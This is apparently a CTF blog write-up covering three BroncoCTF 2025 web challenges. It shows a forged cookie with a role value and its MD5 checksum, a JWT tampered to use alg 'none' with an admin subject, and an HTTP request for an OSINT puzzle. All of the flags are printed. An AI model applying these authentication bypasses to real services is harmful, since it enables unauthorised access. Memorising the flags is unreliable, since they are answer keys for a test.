---
layout: post
title: BroncoCTF 2025
date: 17-02-2025
categories: [Documentation]
tag: [web, bronco, ctf]
image:
  path: /assets/img/titles/broncoctf.png
  alt: broncoctf image
description: Some cool and fun web challenges from broncoCTF.
---

# Web
## Grandma's Secret Recipe

In this `challenge`, we just need to change the content from `kitchen helper` to 'grandma' and replace the `checksum` content with the `MD5 hash` of `grandma` and it's done.

```shell
Cookie: role="grandma"; checksum=a5d19cdd5fd1a8f664c0ee2b5e293167	
```
`Flag: bronco{grandma-makes-b3tter-cookies-than-girl-scouts-and-i-w1ll-fight-you-over-th@t-fact}`

## Miku's Autograph

In this challenge, remove the direct algorithm in `BurpSuite` and replace the value with `miku_admin`

```json
{
  "alg": "none",
  "typ": "JWT"
}
{
  "sub": "miku_admin",
  "exp": 1739780914
}
```

`Flag: bronco{miku_miku_beaaaaaaaaaaaaaaaaaam!}`

## Mary's Lamb is a Little Phreak

This challenge is more related to `OSINT`, so I searched for `mary had a little lamb telephone` and found a sequence of numbers `32123332223993212333322321`

```shell
GET /mary/32123332223993212333322321 HTTP/2
Host: mary.web.broncoctf.xyz
Sec-Ch-Ua-Platform: "Windows"
Access-Control-Allow-Origin: *
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
Sec-Ch-Ua: "Not A(Brand";v="8", "Chromium";v="132"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://mary.web.broncoctf.xyz/
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
```

`Flag: bronco{W0ah_y0u_f0und_m4rys_1itt1e_1amb}"`



